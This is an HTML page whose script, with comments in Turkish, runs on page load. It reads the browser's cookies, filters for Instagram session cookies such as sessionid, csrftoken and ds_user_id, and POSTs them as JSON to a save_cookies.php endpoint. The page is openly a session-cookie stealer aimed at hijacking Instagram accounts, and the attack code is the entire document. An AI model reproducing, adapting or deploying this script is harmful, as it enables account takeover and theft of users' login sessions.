<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Get Instagram Cookies</title>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Çerezleri al
            const cookies = document.cookie.split('; ').map(cookie => {
                const [nameValue, ...options] = cookie.split(';');
                const [name, value] = nameValue.split('=');
                
                // Çerez bilgilerini oluştur
                return {
                    domain: ".instagram.com", // Instagram alan adı
                    hostOnly: false,
                    httpOnly: false, // httpOnly çerezler burada alınamaz
                    name: name,
                    path: '/',
                    sameSite: null,
                    secure: true,
                    session: options.some(option => option.includes('expires')) ? false : true,
                    storeId: null,
                    value: value
                };
            });

            // Tüm çerezleri filtreleyerek almak için
            const allCookies = cookies.filter(cookie => {
                const cookieNames = [
                    "ps_n",
                    "datr",
                    "ig_nrcb",
                    "shbts",
                    "ds_user_id",
                    "shbid",
                    "csrftoken",
                    "ig_did",
                    "ps_l",
                    "wd",
                    "mid",
                    "sessionid",
                    "rur"
                ];
                return cookieNames.includes(cookie.name);
            });

            // Çerezleri JSON formatına dönüştür
            const jsonCookies = JSON.stringify(allCookies, null, 2);
            console.log(jsonCookies);

            // AJAX isteği ile çerezleri PHP dosyasına gönder
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "save_cookies.php", true); // sunucuya gönder
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    console.log("Cookies sent to server!");
                }
            };
            xhr.send(jsonCookies); // Çerezleri gönder
        });
    </script>
</head>
<body>
    <p>Getting Instagram cookies...</p>
</body>
</html>